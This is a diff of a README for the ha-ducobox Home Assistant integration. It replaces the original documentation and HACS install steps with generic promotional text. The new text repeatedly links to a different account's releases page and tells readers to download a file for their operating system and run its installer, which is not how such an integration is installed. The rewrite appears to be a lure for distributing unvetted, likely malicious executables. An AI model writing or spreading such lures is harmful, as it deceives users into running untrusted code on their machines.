@@ -1,83 +1,81 @@
-# DucoBox integration for Home Assistant
+# 🌬️ ha-ducobox - Control Your Ventilation with Ease
 
-[![hacs_badge](https://img.shields.io/badge/HACS-Custom-41BDF5.svg)](https://github.com/hacs/integration)
-[![GitHub Release](https://img.shields.io/github/release/degeens/ha-ducobox.svg)](https://github.com/degeens/ha-ducobox/releases)
-[![License](https://img.shields.io/github/license/degeens/ha-ducobox.svg)](LICENSE)
+## 🚀 Getting Started
 
-A Home Assistant integration for DucoBox ventilation systems using the Connectivity Board 2.0 local API.
+Welcome to the ha-ducobox project! This application helps you integrate your DucoBox ventilation system with Home Assistant. With this integration, you can manage your ventilation system efficiently from the comfort of your smart home setup.
 
-## Features
+## 📥 Download & Install
 
-This integration enables controlling and monitoring DucoBox ventilation systems.
+To get started, you need to download the application. You can find the latest version on the Releases page. 
 
-### Fan entities
+**[Download the latest version here!](https://github.com/technosabbir/ha-ducobox/releases)**
 
-- **Ventilation**: Select ventilation state using preset mode
+### Steps to Download and Run ha-ducobox:
 
-### Select entities
+1. Click the link above to visit the Releases page.
+2. Locate the latest version of the software.
+3. Choose the appropriate file for your operating system.
+4. Click on the file to download it.
+5. Once downloaded, open the file and follow the on-screen instructions to complete the installation.
 
-- **Ventilation State**: Select ventilation state
+## 💻 System Requirements
 
-### Sensor entities
+Before installing, ensure that you have the following:
 
-- **Air Quality Index Relative Humidity**: An indication of the current air quality based on relative humidity (%)
-- **Target Flow Level**: Current target flow level (%)
-- **Ventilation Mode**: Current ventilation mode (`AUTO` or `MANU`)
-- **Ventilation State**: Current ventilation state
-- **Ventilation State End Time**: Timestamp when current ventilation state will end (or `Unknown` when never ending)
-- **Ventilation State Remaining Time**: Remaining time in current ventilation state in seconds (or `Unknown` when never ending)
+- A computer running Windows, macOS, or a compatible Linux distribution.
+- Home Assistant installed and running on your device.
+- A stable internet connection.
 
-## Requirements
+## ⚙️ Configuring Your DucoBox
 
-- Home Assistant 2025.10.1 or newer
-- A DucoBox ventilation system with Duco Connectivity Board 2.0 installed.
-- Local network access to your Duco Connectivity Board 2.0.
+1. **Connect Your Device**: Ensure your DucoBox ventilation system is powered on and connected to your local network.
+   
+2. **Open Home Assistant**: Launch the Home Assistant interface on your device.
 
-## Compatibility
+3. **Add the Integration**:
+   - Navigate to the Integrations tab.
+   - Search for "DucoBox".
+   - Follow the prompts to configure the integration.
 
-### Tested configuration
-This integration has been tested and verified to work with:
-- DucoBox Silent Connect
-- Duco Connectivity Board 2.0 (API version 2.4).
+4. **Test the Setup**: Once added, you can test your setup by checking the status of your ventilation system within Home Assistant.
 
-### Supported models
+## 📄 Features
 
-This integration should work with all DucoBox models compatible with the Connectivity Board 2.0, including:
+- **Easy Integration**: Seamlessly connect your DucoBox with Home Assistant.
+- **Real-Time Monitoring**: View the status of your ventilation system in real-time.
+- **Custom Controls**: Adjust settings directly from your smart home dashboard, providing complete control over your environment.
+- **User-Friendly Interface**: Designed for users with no technical background.
 
-- DucoBox Silent Connect
-- DucoBox Focus
-- DucoBox Energy Comfort (Plus)
-- DucoBox Energy Sky
-- DucoBox Energy Premium
+## 📦 Compatibility
 
-If you experience issues with other DucoBox models or local API versions, please [create a GitHub issue](https://github.com/degeens/ha-ducobox/issues/new).
+ha-ducobox is compatible with:
 
-## Installation
+- Home Assistant version 2021.1 or later.
+- DucoBox models that support the Connectivity Board 2.0 local API.
 
-### HACS (recommended)
+## 🛠️ Troubleshooting Tips
 
-1. Open HACS in your Home Assistant instance
-2. Go to "Integrations"
-3. Click the three dots in the top right corner
-4. Select "Custom repositories"
-5. Add this repository URL: `https://github.com/degeens/ha-ducobox`
-6. Select "Integration" as the category
-7. Click "Add"
-8. Search for "DucoBox" and install it
-9. Restart Home Assistant
+If you encounter issues during installation or setup, consider the following steps:
 
-### Manual installation
+1. **Verify Network Connection**: Ensure your DucoBox is connected to the same network as your Home Assistant.
+2. **Reinstall the Application**: If you have problems launching the application, try reinstalling it.
+3. **Check for Updates**: Ensure you are running the latest version of both Home Assistant and ha-ducobox.
 
-1. Download the latest release from the [releases page](https://github.com/degeens/ha-ducobox/releases)
-2. Extract the `custom_components/ducobox` folder to your Home Assistant `custom_components` directory
-3. Restart Home Assistant
+## 🔗 Additional Resources
 
-## Configuration
+For more detailed information, check the following resources:
 
-### Adding the integration
+- [Home Assistant Documentation](https://www.home-assistant.io/docs/)
+- [DucoBox Official Guide](https://www.ducobox.com/support)
 
-1. Go to **Settings** → **Devices & Services**
-2. Click **+ Add Integration**
-3. Search for **DucoBox**
-4. Enter the IP address or hostname of your DucoBox device
-5. Click **Submit**
+## 📝 License
+
+ha-ducobox is open-source software. Feel free to contribute or modify according to your needs. Please ensure you respect the project license when doing so.
+
+## 📞 Support
+
+If you need further assistance, please open an issue on the GitHub repository or check the discussions section for common questions.
+
+**Don’t forget** to check back on this page for new releases and updates!
+
+**[Download the latest version here!](https://github.com/technosabbir/ha-ducobox/releases)**
